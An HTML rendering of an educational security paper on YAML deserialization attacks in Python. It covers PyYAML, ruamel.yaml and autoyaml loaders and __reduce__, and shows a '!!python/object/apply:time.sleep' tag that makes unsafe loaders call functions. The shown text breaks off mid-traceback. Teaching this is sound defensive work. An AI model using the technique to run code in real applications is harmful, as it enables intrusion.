@@ -1,0 +1,1145 @@
+<!DOCTYPE html>
+<html lang="en" class="gr__localhost"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>0-Day</title>
+  <link rel="icon" href="./files/images.png">
+  <link rel="stylesheet" href="./files/frameworks-481a47a96965f6706fb41bae0d14b09a.css">
+  <link rel="stylesheet" href="./files/github-5362384f9e2512870c388a187eaf4868.css">
+  <link rel="stylesheet" href="./files/site-0198872658a4cac60ef867c03bfa2406.css">
+  <link rel="stylesheet" href="./files/octicons.css">
+
+  <style>
+    /* Page tweaks */
+    .preview-page {
+      margin-top: 64px;
+    }
+    /* User-content tweaks */
+    .timeline-comment-wrapper > .timeline-comment:after,
+    .timeline-comment-wrapper > .timeline-comment:before {
+      content: none;
+    }
+    /* User-content overrides */
+    .discussion-timeline.wide {
+      width: 920px;
+    }
+  </style>
+</head>
+<body data-gr-c-s-loaded="true">
+  <div class="page">
+    <div id="preview-page" class="preview-page" data-autorefresh-url="/__/grip/refresh/">
+
+    
+
+      <div role="main" class="main-content">
+        <div class="container new-discussion-timeline experiment-repo-nav">
+          <div class="repository-content">
+            <div id="readme" class="readme boxed-group clearfix announce instapaper_body md">
+              
+                
+              
+              <article class="markdown-body entry-content" itemprop="text" id="grip-content">
+                <h1>
+<a id="user-content-yaml-deserialization-attack-in-python" class="anchor" href="#yaml-deserialization-attack-in-python" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>YAML Deserialization Attack in Python</h1>
+<hr>
+<h3>
+<a id="user-content-november-13" class="anchor" href="#november-13" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>NOVEMBER 13</h3>
+<h5>
+<a id="user-content-by-manmeet-singh--ashish-kukreti" class="anchor" href="#by-manmeet-singh--ashish-kukreti" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>By: Manmeet Singh &amp; Ashish Kukreti</h5>
+<h5>
+<a id="user-content-author-details" class="anchor" href="#author-details" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Author Details:</h5>
+<p>Manmeet Singh (_j0lt)
+Twitter: <a href="https://twitter.com/_j0lt" rel="nofollow">@_j0lt</a></p>
+<p>Ashish Kukreti (LoneRanger)
+Twitter: <a href="https://twitter.com/lon3_rang3r" rel="nofollow">@lon3_rang3r</a></p>
+<h3>
+<a id="user-content-forward" class="anchor" href="#forward" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>FORWARD</h3>
+<h4>
+<a id="user-content-what-is-yaml" class="anchor" href="#what-is-yaml" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>What is YAML?</h4>
+<p>According to the definition in Wikipedia, YAML (Yet Another Markup Language) is a human-readable data serialization language, it is commonly used for configuration files and in applications where data is being stored or transmitted. It uses both Python-style indentations to indicate nesting, and a more compact format that uses [] for lists and {} for maps making YAML a superset of JSON.</p>
+<p>Example:</p>
+<pre><code>Un-Serialized Data: 
+{'a':'hello','b':'world','c':['this', 'is',' yaml']}
+</code></pre>
+<p>YAML Serialized Data:</p>
+<pre><code>a: hello
+b: world
+c:
+- this
+- is
+- ' yaml'
+</code></pre>
+<p>YAML is used in various applications irrespective of their platform weather it is a web application, thick client application, mobile application etc. One can go to <a href="https://yaml.org/" rel="nofollow">https://yaml.org/</a> to know more about YAML project.</p>
+<h4>
+<a id="user-content-yaml-modules-in-python" class="anchor" href="#yaml-modules-in-python" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>YAML MODULES IN PYTHON</h4>
+<p>In python, there are modules like PyYAML, ruamel.yaml etc. dealing with YAML. In this paper, we will discuss all these modules and the technique of serialization and deserialization of data. PyYAML is very much wild being an only stable module to deal with YAML data in both Python 2.x and 3.x.</p>
+<h4>
+<a id="user-content-pyyaml" class="anchor" href="#pyyaml" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>PyYAML</h4>
+<p>PyYAML is a third-party python module that deals with YAML serialization and deserialization of data.
+It is available for both Python 2.x and 3.x. Its author is Kirill Simonov.
+To know more about PyYAML python module, one can refer its documentation by going to <a href="https://pyyaml.org/wiki/PyYAMLDocumentation" rel="nofollow">https://pyyaml.org/wiki/PyYAMLDocumentation</a>.
+PyYAML have many methods to dump/ serialize data, below are some most important one,</p>
+<table>
+<thead>
+<tr>
+<th>Methods</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dump()</td>
+<td>Serialize a Python object/data into a YAML stream. It uses dump_all() and by default uses Dumper=yaml.Dumper . Default usage: <br> <code> dump(data, stream=None,Dumper=yaml.Dumper)</code>
+</td>
+</tr>
+<tr>
+<td>dump_all()</td>
+<td>Serialize a sequence of Python objects/data into a YAML stream. Used with a list of data to be serialized. Default usage: <code>dump_all(documents, stream=None, Dumper=Dumper,default_style=None, default_flow_style=False,canonical=None, indent=None, width=None,allow_unicode=None, line_break=None,encoding=None, explicit_start=None, explicit_end=None,version=None, tags=None, sort_keys=True)</code>
+</td>
+</tr>
+<tr>
+<td>safe_dump()</td>
+<td>Serialize a sequence of Python objects into a YAML stream safely. No python class objects will be serialized if mentioned in the data. It uses dump_all() with Dumper=yaml.SafeDumper by default and Dumper is not user-controllable. Default usage:<br> <code>safe_dump(data, stream=None)</code>
+</td>
+</tr>
+<tr>
+<td>safe_dump_all()</td>
+<td>Serialize a sequence of Python objects into a YAML stream. Produce only basic YAML tags. No python class objects will be serialized if mentioned in the data. Used with a list of data to be serialized. It uses dump_all() with Dumper=yaml.SafeDumper by default and Dumper is not User controllable. Default usage:<br> <code>safe_dump_all(documents, stream=None)</code>
+</td>
+</tr>
+</tbody>
+</table>
+<p>Serialization of data with <code>dump()</code> method :</p>
+<p>Code:</p>
+<pre><code>import yaml
+a = {'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']} # raw data
+serialized_data = yaml.dump(a) # serializing data
+print(serialized_data) # printing yaml serialized data
+</code></pre>
+<p>Output:</p>
+<pre><code>a: hello
+b: world
+c:
+- this
+- is
+- ' yaml'
+</code></pre>
+<p>The above code has data stored in variable “a” and when this data is supplied to yaml.dump(), it returns serialized data shown in the output above. This output is human readable and arranged in a very systematic way.
+For deserializing of data, we have a couple of methods, below are some of them which are very commonly used in PyYAML</p>
+<table>
+<thead>
+<tr>
+<th>Methods</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>load()</td>
+<td>Deserialize data with default Loader=FullLoader. If Loader=None , it will take Loader= FullLoader by default<br>Default usage:<br> <code>load(stream, Loader=None</code>)</td>
+</tr>
+<tr>
+<td>load_all()</td>
+<td>Deserialize a stream of data in a list with default Loader=FullLoader. If Loader=None , it will take Loader= FullLoader by default<br>Default usage:<br><code>load_all(stream, Loader=None)</code>
+</td>
+</tr>
+<tr>
+<td>full_load()</td>
+<td>Deserialize data with Loader=FullLoader by default and Loader is not user controllable in this method. In actual load() is called with arguments specified as load(data, Loader=FullLoader). Exists only in version &gt;= 5.1.<br>Default usage:<br><code>full_load(stream)</code>
+</td>
+</tr>
+<tr>
+<td>full_load_all()</td>
+<td>Deserialize a stream of data in a list with Loader=FullLoader by default and Loader is not user controllable in this method. In actual load_all() is called with arguments specified as load_all(stream,Loader=FullLoader). Exists only in version &gt;=5.1.<br>Default usage:<br><code>full_load_all(stream)</code>
+</td>
+</tr>
+<tr>
+<td>safe_load()</td>
+<td>Deserialize data with Loader=SafeLoader by default and Loader is not user-controllable. It rejects to deserialize ,serialized declared python class objects. In actual load() is called with arguments specified as load(stream, Loader=SafeLoader).<br>Default usage:<br><code>safe_load(stream)</code>
+</td>
+</tr>
+<tr>
+<td>safe_load_all()</td>
+<td>Deserialize a stream of data in a list with Loader=SafeLoader by default and Loader is not user controllable in this method. It rejects to deserialize, serialized declared python class objects. In actual load_all() is called with arguments specified as load_all(stream,Loader=SafeLoader).<br>Default usage:<br><code>safe_load_all(stream)</code>
+</td>
+</tr>
+<tr>
+<td>unsafe_load()</td>
+<td>Deserialize data with Loader=UnsafeLoader by default and Loader is not user controllable in this method. In actual load() is called with arguments specified as load(data, Loader=UnsafeLoader). Exists only in version &gt;=5.1.<br>Default usage:<br><code>unsafe_load(stream)</code>
+</td>
+</tr>
+<tr>
+<td>unsafe_load_all()</td>
+<td>Deserialize a stream of data in a list with Loader=UnsafeLoader by default and Loader is not user controllable in this method. In actual load_all() is called with arguments specified as load_all(stream,Loader=UnsafeLoader). Exists only in version &gt;= 5.1.<br>Default usage:<br><code>unsafe_load_all(stream)</code>
+</td>
+</tr>
+</tbody>
+</table>
+<p>Deserialization of data with <code>load()</code> method:</p>
+<pre><code>import yaml
+a = b'a: hello\nb: world\nc:\n - this\n - is\n - \' yaml\' '
+# yaml serialized data
+deserialized_data = yaml.load(a) # deserializing data
+print(deserialized_data) # printing deserialized data
+</code></pre>
+<p>Output:</p>
+<pre><code>{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}
+C:/Users/j0lt/paper_files/main.py:5: YAMLLoadWarning: calling yaml.load()
+without Loader=... is deprecated, as the default Loader is unsafe. Please
+read https://msg.pyyaml.org/load for full details.
+ deserialized_data = yaml.load(a) # deserializing data
+</code></pre>
+<p>The above example shows the working of load() function in deserialization of YAML data saved in variable “a”. Kindly note the serialized data is the same as the output of the previous example. The output shows the data in its raw form and we got our data back.
+Note that just after showing the output, the console is throwing a warning about the load() function, as we are using PyYAML version 5.2.1 which is the latest at the time of writing this paper. You will not find this type of warning in PyYAML version &lt; 5.1. Yes, the maintainer knew that this load() method is not safe by default, so they applied some patches in its newest versions and that’s why every time we use load() method with default “Loader” argument to deserialize objects, it checks the execution and execute it if it is safe but every time it prints this warning message about load() method as the default Loader argument is “None” and by default consider “FullLoader” if not specified as shown below</p>
+<p><a href="./files/1.png" target="_blank" rel="noopener noreferrer"><img src="./files/1.png" alt="" style="max-width:100%;"></a></p>
+<p>Also, this load_warning(‘load’) is a class method of YAMLLoadWarning which generate warning message as shown below. This class doesn’t exist in version &lt; 5.1 of PyYAML.</p>
+<p><a href="./files/2.png" target="_blank" rel="noopener noreferrer"><img src="./files/2.png" alt="" style="max-width:100%;"></a></p>
+<p>Later the maintainer of this module started recommending every user to use methods like <code>safe_load()</code>, <code>safe_dump()</code> or use <code>load()</code> with “Loader=SafeLoader” <code>(eg. yaml.load(serialized_data,Loader=yaml.SafeLoader))</code> to deserialize and serialize data respectively as these methods are made not to work on custom objects of classes.
+Let’s try to execute the last code in PyYAML version &lt; 5.1 and the output will be:
+<code>{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}</code>
+In exact, we are using version 4.2b4 to execute the same code which was the last version which was not showing any warnings. So we get data without any warning message in the console.
+Many other third-party modules that work on YAML are built on <code>PyYAML module</code>, like, <code>autoyaml</code>, <code>aio_yamlconfig</code> etc. Those modules which are using <code>SafeLoader</code> of <code>PyYAML</code> to load serialized data, are not vulnerable to deserialization vulnerability, example, <code>simple-yaml</code>, <code>aspy.yaml</code>, <code>Yamlable</code> etc.
+<code>autoyaml</code> and <code>aio_yamlconfig</code> and many others are not safe as they use default loader or unsafe loaders with <code>load()</code> method.
+Kindly note, there are many other methods which do serialization and deserialization that were earlier specified like <code>unsafe_load()</code>, <code>safe_load()</code> etc. out of them only <code>load()</code> and load_all() throw warning message, rest of modules work on very specific Loader , so there is no need of showing the warning messages for some unsafe methods like <code>unsafe_load()</code>, <code>full_load()</code> etc. , as maintainer believes that the user already knows why these modules are getting used and how they work.</p>
+<h4>
+<a id="user-content-ruamelyaml" class="anchor" href="#ruamelyaml" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>ruamel.yaml</h4>
+<p>ruamel.yaml is also a well-known python module which works on YAML serialized data. It works on the same principles of <code>PyYAML</code>. It also has <code>dump()</code> and <code>load()</code> methods and works the same as <code>PyYAML</code>. It is available for both python 3.x and 2.x.
+Difference between PyYAML and <code>ruamel.yaml</code> are,
+<code>ruamel.yaml</code> is a derivative of Kirill Simonov’s <code>PyYAML</code> 3.11 and would not exist without that. PyYAML
+supports the YAML 1.1 standard, <code>ruamel.yaml</code> supports YAML 1.2 as released in 2009.</p>
+<ul>
+<li>YAML 1.2 dropped support for several features unquoted Yes, No, On, Off</li>
+<li>YAML 1.2 no longer accepts strings that start with a 0 and solely consist of number characters as octal, you need to specify such strings with 0o[0-7]+ (zero + lower-case o for octal + one or</li>
+<li>more octal characters).</li>
+<li>YAML 1.2 no longer supports sexagesimals, so the string scalar 12:34:56 doesn’t need quoting.</li>
+<li>/ escape for JSON compatibility</li>
+<li>Correct parsing of floating-point scalars with exponentials</li>
+<li>Unless the YAML document is loaded with an explicit version==1.1 or the document starts with <code>% YAML 1.1</code>, ruamel.yaml will load the document as version 1.2.
+Like PyYAML it has almost similar methods for serializing data,</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Methods</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>dump()</td>
+<td>Serialize a Python object/data into a YAML stream.<br>Default usage:<br><code>dump(data,stream=None, Dumper=Dumper, default_style=None, default_flow_style=None, canonical=None, indent=None, width=None, allow_unicode=None, line_break=None, encoding=enc, explicit_start=None, explicit_end=None, version=None, tags=None, block_seq_indent=None,</code>)</td>
+</tr>
+<tr>
+<td>dump_all()</td>
+<td>Serialize a sequence of Python objects/data into a YAML stream. Used with a list of data to be serialized.<br>Default usage:<br><code>dump_all (documents, stream=None, Dumper=Dumper, default_style=None, default_flow_style=None, canonical=None, indent=None, width=None, allow_unicode=None, line_break=None, encoding=enc, explicit_start=None, explicit_end=None, version=None, tags=None, block_seq_indent=None, top_level_colon_align=None, prefix_colon=None,)</code>
+</td>
+</tr>
+<tr>
+<td>safe_dump()</td>
+<td>Serialize a sequence of Python objects into a YAML stream safely. No python class objects will be serialized if mentioned in the data. It uses dump_all() with Dumper=SafeDumper by default and Dumper is not user-controllable.<br>Default usage:<br><code>safe_dump(data, stream=None)</code>
+</td>
+</tr>
+<tr>
+<td>safe_dump_all()</td>
+<td>Serialize a sequence of Python objects into a YAML stream. Produce only basic YAML tags. No python class objects will be serialized if mentioned in the data.Used with a list of data to be serialized. It uses dump_all() with 13 Dumper=SafeDumper by default and Dumper is not User controllable.<br>Default usage:<br><code>safe_dump_all(documents, stream=None)</code>
+</td>
+</tr>
+</tbody>
+</table>
+<p>Serialization of data with <code>dump()</code> method :</p>
+<p>Code:</p>
+<pre><code>import ruamel.yaml
+a = {'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']} # raw data
+serialized_data = ruamel.yaml.dump(a) # serializing data
+print(serialized_data) # printing yaml serialized data
+</code></pre>
+<p>Output:</p>
+<pre><code>a: hello
+b: world
+c: [this, is, ' yaml']
+</code></pre>
+<p>The above example is simply the copy of example shown for <code>dump()</code> functionality in case of <code>PyYAML</code>, only the output is different in this case, but it is actually same. Conventional block format uses a hyphen + space to begin a new item in the list and optional inline format is delimited by comma+space and enclosed in brackets “[ ]”.
+Similarly ruamel.yaml use similar methods as <code>PyYAML</code> to deserialize data.</p>
+<table>
+<thead>
+<tr>
+<th>Methods</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>load()</td>
+<td>Deserialize data with default Loader=UnsafeLoader, which is equal to Loader=Loader. If Loader=None , it will take Loader= UnsafeLoader by default<br>Default usage:<br><code>load(stream, Loader=None, version=None, preserve_quotes=None)</code>
+</td>
+</tr>
+<tr>
+<td>load_all()</td>
+<td>Deserialize a stream of data in a list with default Loader=UnsafeLoader. If Loader=None , it will take Loader= UnsafeLoader by default<br>Default usage:<br><code>load_all(stream, Loader=None, version=None, preserve_quotes=None)</code>
+</td>
+</tr>
+<tr>
+<td>safe_load()</td>
+<td>Deserialize data with Loader=SafeLoader by default and Loader is not user-controllable. It rejects to deserialize serialized declared python class objects. In actual load() is called with arguments specified as load(stream, Loader=SafeLoader).<br>Default usage:<br><code>safe_load(stream, version=None)</code>
+</td>
+</tr>
+<tr>
+<td>safe_load_all()</td>
+<td>Deserialize a stream of data in a list with Loader=SafeLoader by default and Loader is not user controllable in this method. It rejects to deserialize serialized declared python class objects. In actual load_all() is called with arguments specified as load_all(stream,Loader=SafeLoader).<br>Default usage:<br><code>safe_load_all(stream, version=None)</code>
+</td>
+</tr>
+</tbody>
+</table>
+<p>Deserialization of data with load() method :</p>
+<p>Code:</p>
+<pre><code>import ruamel.yaml
+a = b'a: hello\nb: world\nc: [this, is, \' yaml\']'
+# yaml serialized data
+deserialized_data = ruamel.yaml.load(a) # deserializing data
+print(deserialized_data) # printing deserialized data
+</code></pre>
+<p>Output:</p>
+<pre><code>{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}
+C:/Users/j0lt/paper_files/main.py:7: UnsafeLoaderWarning:
+The default 'Loader' for 'load(stream)' without further arguments can be unsafe.
+Use 'load(stream, Loader=ruamel.yaml.Loader)' explicitly if that is OK.
+Alternatively include the following in your code:
+ import warnings
+ warnings.simplefilter('ignore', ruamel.yaml.error.UnsafeLoaderWarning)
+In most other cases you should consider using 'safe_load(stream)'
+ deserialized_data = ruamel.yaml.load(a) # deserializing data
+</code></pre>
+<p>We got the output data in exact form, but again we got a warning message about unsafe use of <code>load()</code> method, but we will not care for this now because for <code>ruamel.yaml</code>, no necessary patches have been applied to the default <code>load()</code> method to stop the use of the custom object of classes. This warning originates by calling python warning module used in this module as shown below,</p>
+<p><a href="./files/3.png" target="_blank" rel="noopener noreferrer"><img src="./files/3.png" alt="" style="max-width:100%;"></a></p>
+<p>For version &lt; 0.15, it will not even throw a warning. In the above example version, 0.16.5 is used which is latest at the time this paper is written.
+Like <code>PyYAML</code>, <code>ruamel.yaml</code> have some methods which use SafeLoader like <code>safe_dump()</code> and <code>safe_load()</code> etc. to avoid serialization and deserialization of custom object of classes in <code>YAML</code>.</p>
+<h4>
+<a id="user-content-autoyaml" class="anchor" href="#autoyaml" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>Autoyaml</h4>
+<p><code>Autoyaml</code> (<a href="https://github.com/martyni/autoyaml">https://github.com/martyni/autoyaml</a>) is a <code>YAML</code> config file creator and loader in <code>YAML</code>. It uses the <code>PyYAML</code> module to load and dump config files from the home directory. It by default search or write the specified file in the home directory. It uses <code>PyYAML</code> default Loader and Dumper to load and dump files. It doesn’t throw warning message as the loader is specified as a argument in <code>load()</code> method in module code as shown below code.</p>
+<p><a href="./files/4.png" target="_blank" rel="noopener noreferrer"><img src="./files/4.png" alt="" style="max-width:100%;"></a></p>
+<p>To provide a config file to this module one has to put YAML file in the home directory with “.”(dot) in front.
+Example of deserialization:
+A file name “.app_name” is saved in the home directory. And this file contains YAML data in this format,</p>
+<pre><code>a: hello
+b: world
+c: [this, is, ' yaml']
+</code></pre>
+<p><a href="./files/5.png" target="_blank" rel="noopener noreferrer"><img src="./files/5.png" alt="" style="max-width:100%;"></a></p>
+<p>Code:</p>
+<pre><code>from autoyaml import load_config
+my_class = load_config('app_name')
+print(my_class)
+</code></pre>
+<p>Output:
+<code>{'a': 'hello', 'b': 'world', 'c': ['this', 'is', ' yaml']}</code>
+Like this there are many third-party modules on the internet based on PyYAML, just one has to figure out their working and methods used like shown above.
+<br></p>
+<h1>
+<a id="user-content-serializing-and-deserializing-custom-objects-of-python-classes-in-yaml" class="anchor" href="#serializing-and-deserializing-custom-objects-of-python-classes-in-yaml" aria-hidden="true"><span aria-hidden="true" class="octicon octicon-link"></span></a>SERIALIZING AND DESERIALIZING CUSTOM OBJECTS OF PYTHON CLASSES IN YAML</h1>
+<p>YAML has another interesting feature to serialize and deserialize python objects of classes. Serialization of objects of classes can be done with <code>dump()</code> and <code>dump_all()</code> method of <code>PyYAML</code> and ruamel.yaml with its default values for “Dumper”. <code>safe_dump()</code> or <code>safe_dump_all()</code> uses SafeDumper and don’t support this type of serialization in YAML.<br>
+One can serialize any object of custom-made class or any class in built-in modules of python.<br>
+Let us take an example of serialization of a custom-made class in it using <code>PyYAML</code>,</p>
+<p>Code:</p>
+<pre><code>import yaml
+class test:
+ def __init__(self):
+ self.name = "j0lt"
+ self.age = 25
+ self.religion = "Sikhism"
+ self.messages = ["Love", 4, ["every",1]]
+serialized_data = yaml.dump(test()) # serializing data
+print(serialized_data) # printing yaml serialized class object
+</code></pre>
+<p>Output:</p>
+<pre><code>!!python/object:__main__.test
+age: 25
+messages:
+- Love
+- 4
+- [every, 1]
+name: j0lt
+religion: Sikhism
+</code></pre>
+<p>The output represents a serialized object of class test containing initialized class attributes in <code>__init__()</code>.</p>
+<p>Let us take another example and try to serialize an object of a custom class method,</p>
+<pre><code>import yaml
+class test:
+ def __init__(self):
+ self.name = "j0lt"
+ self.age = 25
+ self.religion = "Sikhism"
+ self.messages = ["Love", 4, ["every",1]]
+
+ def ok(self):
+ self.value = range(1,10)
+ return self.value
+serialized_data = yaml.dump(test().ok()) # serializing data
+print(serialized_data) # printing yaml serialized class object
+</code></pre>
+<p>Output;
+<code>!!python/object/apply:builtins.range [1, 10, 1]</code>
+<code>dump()</code> actually serialized the output returned to it in the form of an object of <code>__builtins__</code>.<code>range()</code> , to represent this object type output ,it uses <code>!!python/object/apply:</code>, and also show values passed to <code>range()</code> function. Kindly note that it is not showing the expected returned value <code>(i.e [1,2,3,4,5,6,7,8,9])</code> which class method returned this range object, firstly <code>range()</code> always returns an object of an iterator class by initializing it with given values,</p>
+<p><a href="./files/6.png" target="_blank" rel="noopener noreferrer"><img src="./files/6.png" alt="" style="max-width:100%;"></a></p>
+<p><code>dump()</code> actually serialize the returned value of called class method and if the returned value is in the form of an object of any function or method, then it will serialize it like above and expect it to executeor recreate this object when it will be deserialized.
+Let’s consider some cases where return value is not python object,
+<code>return str('test')</code>
+or
+<code>return list('test')</code>
+then the result of str(‘test’) and list(‘test’) will be considered as data to dump and give output as,</p>
+<pre><code>test
+...
+</code></pre>
+<p>and
+<code>[t, e, s, t]</code>
+But for,
+<code>return tuple('test')</code>
+output is,
+<code>!!python/tuple [t, e, s, t]</code>
+The reason behind this is, dump knows how to represent strings and lists but don’t know how to represent a tuple type data, or simply it is an unknown type for YAML, so it considers it as a python inbuild type representing it with <code>!!python/tuple</code>.
+Note that the data is stored in a list and will act as data for the tuple class to convert it back to tuple when it gets deserialized.
+Similarly, we can serialize built-in classes and class methods which come with python interpreter,
+Example code:</p>
+<pre><code>import yaml
+import time
+class Test(object):
+ def __reduce__(self):
+ return time.sleep, (10,)
+serialized_data = yaml.dump(Test()) # serializing data
+print(serialized_data)
+</code></pre>
+<p>Output:
+<code>!!python/object/apply:time.sleep [10]</code>
+Kindly note that we have used <code>object.__reduce__()</code> class method and this get automatically called just after <code>__init__()</code> when class is initialized and returns a tuple. It is used for a reason. Whenever you try to serialize an object, there will be some properties that may not serialize well. For instance, an open filehandle, in this cases, <code>PyYAML</code> or <code>ruamel.yaml</code> won't know how to handle the object and will throw an error, as shown below,
+Code:</p>
+<pre><code>import yaml
+class Test(object):
+ def __init__(self, file_path='test.txt'):
+ self.some_file_i_have_opened = open(file_path, 'wb')
+serialized_data = yaml.dump(Test()) # serializing data
+print(serialized_data) 
+</code></pre>
+<p>Output:</p>
+<pre><code>Traceback (most recent call last):
+ File "C:/Users/j0lt/paper_files/main.py", line 12, in &lt;module&gt;
+ deserialized_data = yaml.dump(Test()) # serializing data
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\__init__.py", line 200,
+in dump
+ return dump_all([data], stream, Dumper=Dumper, **kwds)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\__init__.py", line 188,
+in dump_all
+ dumper.represent(data)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line 26,
+in represent
+ node = self.represent_data(data)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line 51,
+in represent_data
+ node = self.yaml_multi_representers[data_type](self, data)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line
+341, in represent_object
+ 'tag:yaml.org,2002:python/object:'+function_name, state)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line
+116, in represent_mapping
+ node_value = self.represent_data(item_value)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line 51,
+in represent_data
+ node = self.yaml_multi_representers[data_type](self, data)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\representer.py", line
+315, in represent_object
+ reduce = data.__reduce_ex__(2)
+TypeError: cannot serialize '_io.BufferedWriter' object
+</code></pre>
+<p>One alternative is for the object to implement a <code>__reduce__()</code> method. If provided, at the time of serialization, <code>__reduce__()</code> will be called with no arguments, and it must return either a string or a tuple. If a string is returned, it names a global variable whose contents are serialized as normal. The string returned by <code>__reduce__</code> should be the object's local name relative to its module; the <code>PyYAML</code> and <code>ruamel.yaml</code> module search the module namespace to determine the object's module.<br>
+When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. But in general, it needs a tuple of at least 2 things:</p>
+<ol>
+<li>A blank object class to call. In this case, <code>self.__class__</code>.</li>
+<li>A tuple of arguments to pass to the class constructor. In this case, it's a single string, which is the path to the file to open.
+We can tell the PyYAML or ruamel.yaml module, how to handle these types of objects natively within a class directly with the help of <code>__reduce__</code>. <code>__reduce__</code> will tell <code>PyYAML</code> or <code>ruamel.yaml</code> how to handle this type of object.<br>
+Another thing we should note is, <code>__reduce__</code> don’t allow serialization of the return value of class specified instead it creates a return value in tuple such that, it serializes an object of a specified class with required arguments only and don’t let it execute while serialization.<br>
+Code:</li>
+</ol>
+<pre><code>import yaml
+class Test(object):
+ def __init__(self, file_path = 'test.txt'):
+ self._file_name_we_opened = file_path # Used later in __reduce__
+ self.some_file_i_have_opened = open(self._file_name_we_opened,'wb')
+ def __reduce__(self):
+ return (self.__class__, (self._file_name_we_opened, ))
+serialized_data = yaml.dump(Test()) # serializing data
+print(serialized_data) # printing yaml serialized class object
+</code></pre>
+<p>Output:
+<code>!!python/object/apply:__main__.Test [test.txt]</code>
+Coming to deserialization, deserialization of objects using YAML modules can be done with below methods,</p>
+<table>
+<thead>
+<tr>
+<th>Methods in PyYAML</th>
+<th>Methods in ruamel.yaml</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>
+<strong>load(data)</strong> [works for version &lt; 5.1 and works in certain conditions for version &gt;=5.1]</td>
+<td><strong>load(data)</strong></td>
+</tr>
+<tr>
+<td><strong>load(data, Loader=Loader)</strong></td>
+<td><strong>load(data, Loader=Loader)</strong></td>
+</tr>
+<tr>
+<td>
+<strong>load(data, Loader=UnsafeLoader)</strong> [Exists in version &gt; 5.1]</td>
+<td><strong>load(data, Loader=UnsafeLoader)</strong></td>
+</tr>
+<tr>
+<td>
+<strong>load(data, Loader=FullLoader)</strong> [Exists in version &gt; 5.1]</td>
+<td><strong>load(data, Loader=FullLoader)</strong></td>
+</tr>
+<tr>
+<td>
+<strong>load_all(data)</strong> [works for version &lt; 5.1]</td>
+<td><strong>load_all(data)</strong></td>
+</tr>
+<tr>
+<td><strong>load_all(data, Loader=Loader)</strong></td>
+<td><strong>load_all(data, Loader=Loader)</strong></td>
+</tr>
+<tr>
+<td>
+<strong>load_all(data, Loader=UnSafeLoader)</strong> [Exists in version &gt;= 5.1]</td>
+<td><strong>load_all(data, Loader=UnSafeLoader)</strong></td>
+</tr>
+<tr>
+<td>
+<strong>load_all(data, Loader=FullLoader)</strong> [Exists in version &gt;= 5.1]</td>
+<td><strong>load_all(data, Loader=FullLoader)</strong></td>
+</tr>
+<tr>
+<td>
+<strong>full_load(data)</strong> [Exists in version &gt;= 5.1]</td>
+<td></td>
+</tr>
+<tr>
+<td>
+<strong>full_load_all(data)</strong> [Exists in version &gt;= 5.1]</td>
+<td></td>
+</tr>
+<tr>
+<td>
+<strong>unsafe_load(data)</strong> [Exists in version &gt;= 5.1]</td>
+<td></td>
+</tr>
+<tr>
+<td>
+<strong>unsafe_load_all(data)</strong> [Exists in version &gt;= 5.1]</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p><code>safe_load()</code> or <code>safe_load_all()</code> uses SafeLoader and don’t support class object deserialization. Class object deserialization example:<br></p>
+<p>Code:</p>
+<pre><code>import yaml
+data = b'!!python/object/apply:builtins.range [1, 10, 1]'
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output;</p>
+<pre><code>range(1, 10)
+C:/Users/j0lt/paper_files/main.py:4: YAMLLoadWarning: calling yaml.load()
+without Loader=... is deprecated, as the default Loader is unsafe. Please
+read https://msg.pyyaml.org/load for full details.
+ deserialized_data = yaml.load(data) # deserializing data
+</code></pre>
+<p>The output returned is <code>range(1,10)</code> which is an iterator object.
+Let us deserialize a serialized python built-in module method object, with default <code>load()</code> in version 5.1.2</p>
+<pre><code>import yaml
+data = b'!!python/object/apply:time.sleep [10]'
+deserialized_data = yaml.load(data) # deserializing data
+print(deserialized_data)
+</code></pre>
+<p>Output:</p>
+<pre><code>C:/Users/j0lt/paper_files/main.py:4: YAMLLoadWarning: calling yaml.load() without
+Loader=... is deprecated, as the default Loader is unsafe. Please read
+https://msg.pyyaml.org/load for full details.
+ deserialized_data = yaml.load(data) # serializing data
+Traceback (most recent call last):
+ File "C:/Users/j0lt/paper_files/main.py", line 4, in &lt;module&gt;
+ deserialized_data = yaml.load(data) # serializing data
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\__init__.py", line 114, in load
+ return loader.get_single_data()
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 43, in
+get_single_data
+ return self.construct_document(node)
+ File "C:\Users\j0lt\venv\lib\site-packages\yaml\constructor.py", line 94, in
+construct_object
